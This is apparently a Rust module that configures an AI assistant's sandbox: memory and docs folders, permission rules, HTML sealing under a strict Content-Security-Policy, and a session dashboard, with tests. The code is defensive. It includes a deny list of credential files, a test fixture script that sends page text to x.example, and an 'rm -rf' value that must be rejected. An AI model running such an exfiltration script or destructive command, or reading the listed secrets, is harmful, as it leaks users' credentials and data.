//! Brutus's folder and what the app writes into it before every run.

use serde_json::{json, Value};
use std::fs;
use std::path::{Path, PathBuf};

pub(crate) fn dir() -> PathBuf {
    crate::config::config_dir().join("brutus")
}

const MEMORY_SEED: &str = "# Memory\n\nWhat Brutus keeps about you. You can edit or empty this file.\n";

/// Create the folder and `memory.md`, and return the folder's RESOLVED path: a permission
/// rule must name the real path (`/tmp` is `/private/tmp` on macOS) or it matches nothing.
pub(crate) fn ensure() -> Result<PathBuf, String> {
    let d = dir();
    fs::create_dir_all(&d).map_err(|e| e.to_string())?;
    let mem = d.join("memory.md");
    if !mem.exists() {
        fs::write(&mem, MEMORY_SEED).map_err(|e| e.to_string())?;
    }
    fs::create_dir_all(d.join("docs")).map_err(|e| e.to_string())?;
    fs::canonicalize(&d).map_err(|e| e.to_string())
}

/// The writes he is allowed: his memory, and the documents he writes when asked for one.
/// `Edit(…)` covers every file-editing tool — Claude Code ignores `Write(…)` rules — and
/// `//` makes the path absolute; one `/` would be relative to this settings file and
/// silently deny everything.
pub(crate) fn settings_json(resolved_dir: &Path) -> Value {
    let mem = resolved_dir.join("memory.md");
    let docs = resolved_dir.join("docs");
    json!({ "permissions": {
        "allow": [format!("Edit(/{})", mem.to_string_lossy()), format!("Edit(/{}/**)", docs.to_string_lossy())],
        "deny": SECRET_READS,
    } })
}

/// A document he may name: one plain `.md` or `.html` file directly in his docs folder.
pub(crate) fn valid_doc_name(name: &str) -> bool {
    let ext_ok = name.ends_with(".md") || name.ends_with(".html");
    ext_ok
        && !name.starts_with('.')
        && name.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
}

/// The policy an HTML doc is opened under: no script, no request of any kind, inline style
/// and embedded images only. Browsers enforce every policy a page carries, so one placed
/// first holds whatever the document declares after it.
const DOC_CSP: &str = "default-src 'none'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'";

/// The HTML he wrote, preceded by that policy.
pub(crate) fn sealed_html(html: &str) -> String {
    format!("<meta http-equiv=\"Content-Security-Policy\" content=\"{DOC_CSP}\">\n{html}")
}

/// Files he must not read even inside a folder he may: a category folder can hold whole
/// repos, `.env` files included. Absolute (`//`) on purpose — measured: `Read(**/.env)` is
/// relative to this settings file and blocked nothing, `Read(//**/.env)` blocked the read.
/// Read rules cover Grep and Glob too.
const SECRET_READS: [&str; 19] = [
    "Read(//**/.env)",
    "Read(//**/.env.*)",
    "Read(//**/.ssh/**)",
    "Read(//**/*.pem)",
    "Read(//**/*.key)",
    "Read(//**/id_rsa*)",
    "Read(//**/id_ed25519*)",
    "Read(//**/*secret*.json)",
    "Read(//**/.netrc)",
    "Read(//**/.npmrc)",
    "Read(//**/.envrc)",
    "Read(//**/.git-credentials)",
    "Read(//**/credentials*.json)",
    "Read(//**/.aws/**)",
    "Read(//**/*.p12)",
    "Read(//**/*.jks)",
    "Read(//**/*.keystore)",
    "Read(//**/*.tfvars)",
    "Read(//**/.pypirc)",
];

/// What he may read: the category folders (where notes.md live) and the knowledge
/// folders — never a space root, which can be a whole repo tree or `~` itself. Existing
/// only, canonicalized, deduped, and never `home` or one of its ancestors: under
/// `--restricted` these folders ARE the read boundary.
pub(crate) fn read_dirs(cfg: &Value, home: &Path) -> Vec<String> {
    let home = fs::canonicalize(home).unwrap_or_else(|_| home.to_path_buf());
    let mut out: Vec<String> = Vec::new();
    let mut push = |p: &str| {
        if p.trim().is_empty() {
            return;
        }
        let Ok(c) = fs::canonicalize(p) else { return };
        if !c.is_dir() || home.starts_with(&c) {
            return;
        }
        let s = c.to_string_lossy().into_owned();
        if !out.contains(&s) {
            out.push(s);
        }
    };
    for sd in cfg.get("scanDirs").and_then(Value::as_array).into_iter().flatten() {
        if let Some(b) = sd.get("base").and_then(Value::as_str) {
            push(b);
        }
    }
    for r in cfg.get("roots").and_then(Value::as_array).into_iter().flatten() {
        if let Some(v) = r.get("vaultPath").and_then(Value::as_str) {
            push(v);
        }
    }
    out
}

fn cell(v: &str) -> String {
    v.replace('|', "/").replace('\n', " ").trim().to_string()
}

fn strs(v: &Value, key: &str) -> Vec<String> {
    v.get(key)
        .and_then(Value::as_array)
        .map(|a| a.iter().filter_map(Value::as_str).map(str::to_string).collect())
        .unwrap_or_default()
}

fn tickets_cell(s: &Value) -> String {
    let mut tickets = strs(s, "tickets");
    if tickets.is_empty() {
        if let Some(t) = s.get("ticket").and_then(Value::as_str).filter(|t| !t.is_empty()) {
            tickets.push(t.to_string());
        }
    }
    let states = strs(s, "ticketStates");
    tickets
        .iter()
        .map(|t| {
            let st = states.iter().find_map(|l| l.strip_prefix(&format!("{t}: ")));
            match st {
                Some(w) => format!("{t} ({w})"),
                None => t.clone(),
            }
        })
        .collect::<Vec<_>>()
        .join(", ")
}

fn prs_cell(s: &Value, prs: &Value) -> String {
    let mut links = strs(s, "prLinks");
    if links.is_empty() {
        if let Some(l) = s.get("prLink").and_then(Value::as_str).filter(|l| !l.is_empty()) {
            links.push(l.to_string());
        }
    }
    links
        .iter()
        .map(|u| {
            let n = u.rsplit('/').next().unwrap_or(u);
            match prs.get(u).and_then(|p| p.get("state")).and_then(Value::as_str) {
                Some(st) => format!("#{n} ({st})"),
                None => format!("#{n}"),
            }
        })
        .collect::<Vec<_>>()
        .join(", ")
}

fn row(s: &Value, status: &str, prs: &Value) -> String {
    let f = |k: &str| s.get(k).and_then(Value::as_str).unwrap_or("");
    let last = [f("lastActivity"), f("lastActivityAt"), f("updatedAt")]
        .into_iter()
        .find(|v| !v.is_empty())
        .unwrap_or("");
    format!(
        "| {} | {} | {} | {} | {} | {} | {} | {} |",
        cell(f("name")), cell(f("root")), cell(f("category")), cell(status),
        cell(&tickets_cell(s)), cell(&prs_cell(s, prs)), cell(last), cell(f("notesPath")),
    )
}

/// The dashboard as the app sees it. Live sessions carry their process status; stale ones
/// are listed as such; closed ones only from `cutoff` (YYYY-MM-DD) on; archived never.
pub(crate) fn dashboard_md(
    live: &[Value], hist: &Value, prs: &Value, knowledge: &[String], cutoff: &str, stamp: &str,
) -> String {
    let mut md = format!(
        "# Dashboard\n\nGenerated {stamp}. Knowledge folders: {}\n\n\
         | Session | Space | Category | Status | Tickets | PRs | Last activity | Notes |\n\
         |---|---|---|---|---|---|---|---|\n",
        if knowledge.is_empty() { "none".to_string() } else { knowledge.join(", ") }
    );
    for s in live {
        let st = s.get("status").and_then(Value::as_str).unwrap_or("idle");
        md.push_str(&row(s, st, prs));
        md.push('\n');
    }
    for s in hist.get("stale").and_then(Value::as_array).into_iter().flatten() {
        md.push_str(&row(s, "stale", prs));
        md.push('\n');
    }
    for s in hist.get("closed").and_then(Value::as_array).into_iter().flatten() {
        let date = s.get("historyDate").and_then(Value::as_str).unwrap_or("");
        if date >= cutoff {
            md.push_str(&row(s, &format!("closed {date}"), prs));
            md.push('\n');
        }
    }
    md
}

pub(crate) fn memory_count(text: &str) -> usize {
    text.lines().filter(|l| l.trim_start().starts_with("- ")).count()
}

const NUDGE_STATE_MAX: usize = 1 << 20;

/// What the nudges remember between runs, from `nudges.json` and `triage.json`. A missing
/// or unreadable file is an empty state: the next run then takes the morning shape.
pub(crate) fn nudge_state_from(nudges: Option<&str>, triage: Option<&str>) -> Value {
    let n: Value = nudges.and_then(|s| serde_json::from_str(s).ok()).unwrap_or(Value::Null);
    let t: Value = triage.and_then(|s| serde_json::from_str(s).ok()).filter(Value::is_object).unwrap_or(json!({}));
    let said = n.get("said").cloned().filter(Value::is_object).unwrap_or(json!({}));
    let last_visit = n.get("lastVisit").cloned().filter(Value::is_number).unwrap_or(Value::Null);
    let last_facts = n.get("lastFacts").cloned().filter(Value::is_array).unwrap_or(Value::Null);
    let pending = n.get("pending").cloned().filter(Value::is_object).unwrap_or(Value::Null);
    json!({ "said": said, "lastVisit": last_visit, "lastFacts": last_facts, "triage": t, "pending": pending })
}

/// The state files that exist but cannot be read back. They are reset on the next save, so
/// the caller logs them first.
pub(crate) fn unreadable_nudge_files(nudges: Option<&str>, triage: Option<&str>) -> Vec<&'static str> {
    let bad = |s: Option<&str>| s.is_some_and(|s| !serde_json::from_str::<Value>(s).is_ok_and(|v| v.is_object()));
    [("nudges.json", nudges), ("triage.json", triage)].into_iter().filter(|(_, s)| bad(*s)).map(|(f, _)| f).collect()
}

/// A triage answer: an 8-hex-digit line hash and one of two words. The only thing a model's
/// output reaches on disk, so the reply parser and the save hold it to the same shape.
pub(crate) fn is_triage_entry(k: &str, v: &Value) -> bool {
    k.len() == 8 && k.bytes().all(|b| b.is_ascii_hexdigit()) && matches!(v.as_str(), Some("you") | Some("agent"))
}

/// The two file bodies for a state the renderer sends. Triage answers are the only thing
/// a model's output reaches, so they are held to two words and a hash-shaped key.
pub(crate) fn split_nudge_state(v: &Value) -> Result<(String, String), String> {
    let o = v.as_object().ok_or("nudge state must be an object")?;
    let triage = o.get("triage").cloned().unwrap_or(json!({}));
    let t = triage.as_object().ok_or("triage must be an object")?;
    if let Some(k) = t.iter().find(|(k, v)| !is_triage_entry(k, v)).map(|(k, _)| k) {
        return Err(format!("not a triage entry: {k}"));
    }
    let pending = o.get("pending").cloned().unwrap_or(Value::Null);
    if !(pending.is_null() || pending.is_object()) {
        return Err("a pending nudge must be an object".into());
    }
    let nudges = json!({
        "pending": pending,
        "said": o.get("said").cloned().unwrap_or(json!({})),
        "lastVisit": o.get("lastVisit").cloned().unwrap_or(Value::Null),
        "lastFacts": o.get("lastFacts").cloned().unwrap_or(Value::Null),
    })
    .to_string();
    let triage = triage.to_string();
    if nudges.len() + triage.len() > NUDGE_STATE_MAX {
        return Err("nudge state over 1 MiB".into());
    }
    Ok((nudges, triage))
}

/// A state file's body: `None` when it does not exist, an error when it exists and cannot
/// be read. The two differ: a missing file starts empty, an unreadable one must not be
/// saved over, or what it holds (what was said, the triage) would be lost for good.
pub(crate) fn read_state_file(p: &Path) -> Result<Option<String>, String> {
    match fs::read_to_string(p) {
        Ok(s) => Ok(Some(s)),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(e) => Err(format!("{}: {e}", p.display())),
    }
}

/// Writes the two state files in `dir`, refusing while either exists and cannot be read.
pub(crate) fn save_nudge_state_in(dir: &Path, state: &Value) -> Result<(), String> {
    let (nudges, triage) = split_nudge_state(state)?;
    for f in ["nudges.json", "triage.json"] {
        read_state_file(&dir.join(f)).map_err(|e| format!("not saved over an unreadable file ({e})"))?;
    }
    crate::atomic_write(&dir.join("nudges.json"), &nudges)?;
    crate::atomic_write(&dir.join("triage.json"), &triage)
}

/// True when `cwd` is Brutus's folder — his runs are Claude Code processes like any other,
/// and must not be listed as sessions.
pub(crate) fn is_brutus_cwd(cwd: &str) -> bool {
    if cwd.is_empty() {
        return false;
    }
    let mine = fs::canonicalize(dir()).unwrap_or_else(|_| dir());
    let theirs = fs::canonicalize(cwd).unwrap_or_else(|_| PathBuf::from(cwd));
    theirs == mine
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn settings_allow_edits_on_his_memory_and_his_docs_only() {
        let s = settings_json(Path::new("/private/tmp/x/brutus"));
        assert_eq!(s["permissions"]["allow"], json!([
            "Edit(//private/tmp/x/brutus/memory.md)",
            "Edit(//private/tmp/x/brutus/docs/**)",
        ]));
    }

    #[test]
    fn a_doc_name_is_one_plain_file_in_his_docs_folder() {
        for ok in ["brief.md", "perf-dossier.html", "GOSDK-1_notes.v2.md"] {
            assert!(valid_doc_name(ok), "{ok}");
        }
        for bad in ["../memory.md", "a/b.md", ".hidden.md", "x.sh", "x.htm", "", "x.md\n", "x .md"] {
            assert!(!valid_doc_name(bad), "{bad:?}");
        }
    }

    // A doc is written from notes that other people and sessions wrote, so its HTML may
    // carry a script that sends them somewhere. The copy that is opened forbids every
    // script and every request, whatever the file itself declares.
    #[test]
    fn an_html_doc_opens_sealed_against_scripts_and_requests() {
        let sealed = sealed_html("<html><head><script>fetch('https://x.example/?'+document.body.innerText)</script></head><body>hi</body></html>");
        let csp = sealed.split('\n').next().unwrap();
        assert!(csp.starts_with("<meta http-equiv=\"Content-Security-Policy\""), "{csp}");
        assert!(csp.contains("default-src 'none'") && !csp.contains("script-src") && csp.contains("connect-src 'none'"));
        assert!(sealed.ends_with("</html>"), "the document itself is kept as written");
    }

    // A category folder can hold whole repos, .env files included — the review found
    // three on this machine. Measured: Read(**/.env) blocked nothing (relative to the
    // settings file), Read(//**/.env) blocked the read. Every deny rule is absolute.
    #[test]
    fn secrets_are_denied_by_absolute_patterns_even_inside_a_readable_folder() {
        let deny = settings_json(Path::new("/x"))["permissions"]["deny"].clone();
        let deny: Vec<String> = serde_json::from_value(deny).unwrap();
        for must in ["Read(//**/.env)", "Read(//**/.env.*)", "Read(//**/.ssh/**)", "Read(//**/*.pem)", "Read(//**/*secret*.json)"] {
            assert!(deny.iter().any(|d| d == must), "missing {must}: {deny:?}");
        }
        assert!(deny.iter().all(|d| d.starts_with("Read(//")), "a pattern without // matches nothing: {deny:?}");
    }

    // The review found these still readable inside a category folder.
    #[test]
    fn credentials_beyond_env_and_keys_are_denied_too() {
        let deny = settings_json(Path::new("/x"))["permissions"]["deny"].clone();
        let deny: Vec<String> = serde_json::from_value(deny).unwrap();
        for must in ["Read(//**/.envrc)", "Read(//**/.git-credentials)", "Read(//**/credentials*.json)",
                     "Read(//**/.aws/**)", "Read(//**/*.p12)", "Read(//**/*.jks)", "Read(//**/*.keystore)",
                     "Read(//**/*.tfvars)", "Read(//**/.pypirc)"] {
            assert!(deny.iter().any(|d| d == must), "missing {must}: {deny:?}");
        }
    }

    // The probe replays these rules against the real claude; it must replay all of them.
    #[test]
    fn the_sandbox_probe_uses_the_same_deny_rules() {
        let probe = include_str!("../../scripts/probe-brutus-sandbox.sh");
        for rule in SECRET_READS {
            assert!(probe.contains(&format!("\"{rule}\"")), "probe-brutus-sandbox.sh lacks {rule}");
        }
    }

    #[test]
    fn reads_are_the_category_and_knowledge_folders_never_a_root_or_home() {
        let t = std::env::temp_dir().join(format!("ao-brutus-dirs-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&t);
        let home = t.join("home");
        for d in ["home/work/BUG", "home/work/FEAT", "home/vault"] {
            std::fs::create_dir_all(t.join(d)).unwrap();
        }
        let h = home.to_string_lossy();
        let cfg = json!({
            "scanDirs": [
                { "base": format!("{h}/work/BUG") }, { "base": format!("{h}/work/FEAT") },
                { "base": format!("{h}/work/BUG") },          // duplicate
                { "base": format!("{h}/work/GONE") },         // does not exist
                { "base": format!("{h}") },                   // a category AT home: refused
            ],
            "roots": [
                { "path": format!("{h}/work"), "vaultPath": format!("{h}/vault") },
                { "path": format!("{h}") },                   // a root at home: never passed
            ],
        });
        let dirs = read_dirs(&cfg, &home);
        let canon = |p: &str| std::fs::canonicalize(t.join(p)).unwrap().to_string_lossy().into_owned();
        assert_eq!(dirs, vec![canon("home/work/BUG"), canon("home/work/FEAT"), canon("home/vault")]);
        let _ = std::fs::remove_dir_all(&t);
    }

    #[test]
    fn the_dashboard_lists_live_stale_and_recent_closed_but_not_old_or_archived() {
        let live = vec![json!({ "name": "checkout", "root": "Work", "category": "FEAT", "status": "waiting",
            "tickets": ["FEAT-1", "FEAT-2"], "ticketStates": ["FEAT-1: In Review"],
            "prLinks": ["https://github.com/o/r/pull/12"], "lastActivity": "2026-09-23 10:00",
            "notesPath": "/w/FEAT/checkout/notes.md" })];
        let hist = json!({
            "stale": [{ "name": "old-export", "category": "FEAT", "historyDate": "2026-09-10", "notesPath": "/w/FEAT/old/notes.md" }],
            "closed": [
                { "name": "recent", "category": "BUG", "historyDate": "2026-09-20", "notesPath": "/w/BUG/recent/notes.md" },
                { "name": "ancient", "category": "BUG", "historyDate": "2026-08-01", "notesPath": "/w/BUG/ancient/notes.md" },
            ],
            "archived": [{ "name": "gone", "category": "BUG", "historyDate": "2026-09-22", "notesPath": "/x" }],
        });
        let prs = json!({ "https://github.com/o/r/pull/12": { "state": "merged" } });
        let md = dashboard_md(&live, &hist, &prs, &["/v".to_string()], "2026-09-09", "2026-09-23 10:05");
        assert!(md.contains("| checkout | Work | FEAT | waiting | FEAT-1 (In Review), FEAT-2 | #12 (merged) | 2026-09-23 10:00 | /w/FEAT/checkout/notes.md |"), "{md}");
        assert!(md.contains("| old-export |") && md.contains("| stale |"));
        assert!(md.contains("| recent |") && md.contains("closed 2026-09-20"));
        assert!(!md.contains("ancient"), "closed before the cutoff is left out");
        assert!(!md.contains("gone"), "archived is left out");
        assert!(md.contains("Knowledge folders: /v"));
        assert!(md.contains("Generated 2026-09-23 10:05"));
    }

    #[test]
    fn a_pipe_in_a_name_cannot_break_the_table() {
        let live = vec![json!({ "name": "a|b", "category": "FEAT", "status": "idle", "notesPath": "/n" })];
        let md = dashboard_md(&live, &json!({}), &json!({}), &[], "2026-01-01", "x");
        assert!(md.contains("| a/b |"));
    }

    #[test]
    fn memory_counts_bullets_only() {
        assert_eq!(memory_count("# Memory\n\n- 2026-09-23 likes short answers\n- x\ntext\n"), 2);
        assert_eq!(memory_count(""), 0);
    }

    #[test]
    fn nudge_state_defaults_when_the_files_are_missing_or_broken() {
        let v = nudge_state_from(None, Some("not json"));
        assert_eq!(v, json!({ "said": {}, "lastVisit": null, "lastFacts": null, "triage": {}, "pending": null }));
        assert_eq!(unreadable_nudge_files(None, Some("not json")), vec!["triage.json"]);
        assert_eq!(unreadable_nudge_files(Some("{}"), Some("[]")), vec!["triage.json"], "triage must be an object");
        assert!(unreadable_nudge_files(Some("{}"), None).is_empty(), "a missing file is not a broken one");
    }

    #[test]
    fn nudge_state_round_trips_through_its_two_files() {
        let st = json!({ "said": { "waiting|/w/a/notes.md": "2026-10-13" }, "lastVisit": 1760000000000u64,
                         "lastFacts": [{ "key": "waiting|/w/a/notes.md" }], "triage": { "0a1b2c3d": "you" },
                         "pending": { "text": "[[session:a]] waits.", "stale": [], "lang": "en" } });
        let (n, t) = split_nudge_state(&st).unwrap();
        assert_eq!(nudge_state_from(Some(&n), Some(&t)), st);
    }

    fn nudge_dir(name: &str) -> std::path::PathBuf {
        let t = std::env::temp_dir().join(format!("ao-nudge-state-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&t);
        fs::create_dir_all(&t).unwrap();
        t
    }

    #[test]
    fn a_missing_state_file_reads_as_none_and_an_unreadable_one_as_an_error() {
        let t = nudge_dir("read");
        assert_eq!(read_state_file(&t.join("nudges.json")), Ok(None));
        fs::create_dir(t.join("triage.json")).unwrap();
        assert!(read_state_file(&t.join("triage.json")).is_err());
        let _ = fs::remove_dir_all(&t);
    }

    #[test]
    fn a_state_file_that_cannot_be_read_is_never_saved_over() {
        let t = nudge_dir("save");
        let st = json!({ "said": { "a": "2026-10-14" } });
        save_nudge_state_in(&t, &st).unwrap();
        assert!(fs::read_to_string(t.join("nudges.json")).unwrap().contains("2026-10-14"));
        fs::remove_file(t.join("triage.json")).unwrap();
        fs::create_dir(t.join("triage.json")).unwrap();
        assert!(save_nudge_state_in(&t, &st).is_err());
        assert!(t.join("triage.json").is_dir(), "left as it was");
        let _ = fs::remove_dir_all(&t);
    }

    #[test]
    fn nudge_state_refuses_what_it_should_not_store() {
        assert!(split_nudge_state(&json!([])).is_err());
        assert!(split_nudge_state(&json!({ "triage": { "0a1b2c3d": "rm -rf" } })).is_err());
        assert!(split_nudge_state(&json!({ "triage": { "../x": "you" } })).is_err());
        let big = "x".repeat(1_100_000);
        assert!(split_nudge_state(&json!({ "lastFacts": [big] })).is_err());
        assert!(split_nudge_state(&json!({ "pending": "text" })).is_err(), "a pending nudge is an object or null");
    }
}
